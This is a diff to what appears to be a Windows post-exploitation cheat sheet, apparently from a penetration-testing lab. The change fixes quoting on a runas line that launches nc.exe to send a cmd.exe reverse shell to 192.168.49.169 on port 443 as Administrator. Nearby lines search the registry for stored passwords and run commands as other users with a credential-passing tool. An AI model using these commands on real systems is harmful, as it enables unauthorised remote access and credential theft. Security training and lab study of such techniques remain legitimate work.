@@ -34,7 +34,7 @@ net user /domain [username]   # check domain group of the user
 reg query HKLM /f pass /t REG_SZ /s
 -------------------------Run As----------------------------
 runas /netonly /user:[username] cmd	# run cmd as another user (even if they dont exists)
-runas /env /profile /user:DVR4\Administrator "C:\users\viewer\nc.exe -e cmd.exe 192.168.49.169 443 # useful when ssh not working
+runas /env /profile /user:DVR4\Administrator "C:\users\viewer\nc.exe -e cmd.exe 192.168.49.169 443" # useful when ssh not working
 Import-module invoke-runascs.ps1        # https://github.com/antonioCoco/RunasCs
 Invoke-RunasCs [username] [password] [cmd]
 -------------------------Add user--------------------------
